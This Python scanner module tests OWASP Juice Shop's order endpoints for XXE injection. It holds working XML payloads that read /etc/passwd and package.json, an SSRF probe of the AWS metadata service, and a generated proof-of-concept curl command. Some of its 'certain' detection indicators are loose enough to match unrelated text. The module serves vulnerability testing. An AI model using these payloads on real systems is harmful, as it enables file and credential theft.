"""
XXE (XML External Entity) injection checks:
  - XxeOrderCheck      : B2B order endpoint XML processing
  - XxeTrackOrderCheck : Track order SOAP/XML endpoint
"""
import re
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck

# XXE payloads
_XXE_PAYLOADS = [
    # Basic file read (Linux)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "file:///etc/passwd",
        "linux-passwd",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        "file:///etc/hostname",
        "hostname",
    ),
    # Package.json (app secrets)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///juice-shop/package.json">]><foo>&xxe;</foo>',
        "file:///juice-shop/package.json",
        "package-json",
    ),
    # SSRF via XXE
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        "http://169.254.169.254",
        "aws-metadata-ssrf",
    ),
]

# OData/Swagger-style XML for B2B
_B2B_ORDER_XML = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<orderLines>
  <orderLine>
    <productId>1</productId>
    <quantity>1</quantity>
    <customerReference>&xxe;</customerReference>
    <couponCode></couponCode>
  </orderLine>
</orderLines>"""


class XxeB2bCheck(BaseScanCheck):
    """
    Tests B2B order endpoint for XXE injection.
    Juice Shop's /b2b/v2/orders accepts XML order data.
    """
    check_id = "xxe-b2b"
    check_type = CheckType.ACTIVE
    name = "XXE Injection (B2B Orders)"
    description = "Detects XML External Entity injection in B2B order processing"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("order", "b2b", "xml", "login", "auth")):
            return []
        if getattr(self.__class__, '_attempted', False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Get auth token
        import uuid
        uid = uuid.uuid4().hex[:8]
        email = f"xxe_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        try:
            await client.post(f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": "xxe_test", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                headers={"Content-Type": "application/json"})
            login = await client.post(f"{base}/rest/user/login",
                json={"email": email, "password": pw},
                headers={"Content-Type": "application/json"})
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            auth = {"Authorization": f"Bearer {token}"}
        except Exception:
            return []

        # Test B2B order endpoint
        b2b_endpoints = [
            "/b2b/v2/orders",
            "/api/orders",
            "/rest/orders",
        ]

        for endpoint in b2b_endpoints:
            try:
                resp = await client.post(
                    f"{base}{endpoint}",
                    content=_B2B_ORDER_XML,
                    headers={**auth, "Content-Type": "application/xml"},
                )

                # Check if XXE was processed (look for passwd content or error)
                body = resp.text
                xxe_indicators = [
                    "root:x:", "root:!", "/bin/bash", "/bin/sh",  # /etc/passwd
                    "hostname",  # /etc/hostname
                    "juice-shop",  # package.json
                    "\"name\"",  # package.json
                ]
                if any(ind in body for ind in xxe_indicators):
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.1,
                        description=(
                            f"XXE injection confirmed at {endpoint}! "
                            f"External entity resolved and file content returned in response. "
                            f"File system readable via XML entity injection."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST {endpoint} HTTP/1.1\n"
                                f"Content-Type: application/xml\n\n"
                                f"{_B2B_ORDER_XML[:200]}..."
                            ),
                            response=resp,
                            payload=_B2B_ORDER_XML,
                            poc_curl=(
                                f"curl -s -X POST '{base}{endpoint}' "
                                f"-H 'Content-Type: application/xml' "
                                f"-H 'Authorization: Bearer TOKEN' "
                                f"-d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><orderLines><orderLine><productId>1</productId><quantity>1</quantity><customerReference>&xxe;</customerReference><couponCode></couponCode></orderLine></orderLines>'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]

                # Check if endpoint exists (error response that isn't 404)
                if resp.status_code not in (404, 405) and "xml" in body.lower():
                    # Might be vulnerable but no file output — try a simpler payload
                    for payload, file_target, variant in _XXE_PAYLOADS:
                        try:
                            r2 = await client.post(
                                f"{base}{endpoint}",
                                content=payload,
                                headers={**auth, "Content-Type": "application/xml"},
                            )
                            if any(ind in r2.text for ind in xxe_indicators):
                                return [CheckResult(
                                    check_id=self.check_id,
                                    vulnerable=True,
                                    confidence=Confidence.CERTAIN,
                                    severity=Severity.CRITICAL,
                                    cvss=9.1,
                                    description=(
                                        f"XXE confirmed ({variant}): {file_target} content in response. "
                                        f"Endpoint: {endpoint}"
                                    ),
                                    evidence=self._make_evidence(
                                        request_raw=f"POST {endpoint} HTTP/1.1\n\n{payload[:200]}",
                                        response=r2,
                                        payload=payload,
                                        poc_curl=f"curl -s -X POST '{base}{endpoint}' -d '{payload[:100]}...'",
                                    ),
                                    insertion_point=insertion_point,
                                )]
                        except Exception:
                            continue
            except Exception:
                continue

        return []
